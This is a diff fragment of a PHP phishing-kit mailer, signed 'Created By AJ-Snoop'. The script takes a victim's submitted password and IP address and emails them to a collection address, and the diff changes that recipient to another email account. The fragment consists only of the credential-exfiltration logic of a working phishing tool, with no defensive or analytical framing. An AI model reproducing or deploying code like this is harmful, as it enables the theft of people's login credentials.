@@ -9,7 +9,7 @@ $message .= "Password : ".$_POST['pass']."\n";
 $message .= "IP: ".$ip."\n";
 $message .= "---------------Created By AJ-Snoop------------------------------\n";
 
-$recipient = "sales.alwahabtrading@gmail.com";
+$recipient = "bossemail@gmx.net";
 $subject = "Gbagam!";
 $headers = "From";
 $headers .= $_POST['eMailAdd']."\n";
